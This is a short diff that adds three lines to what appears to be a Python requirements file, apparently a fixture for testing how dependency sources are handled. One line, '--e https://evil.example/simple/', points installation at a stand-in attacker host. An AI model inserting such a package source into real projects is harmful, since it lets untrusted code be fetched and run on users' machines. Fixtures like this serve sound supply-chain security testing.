@@ -1,0 +1,3 @@
+requests==2.31.0
+--e https://evil.example/simple/
+mypkg @ git+https://github.com/someone/mypkg.git@v1.0
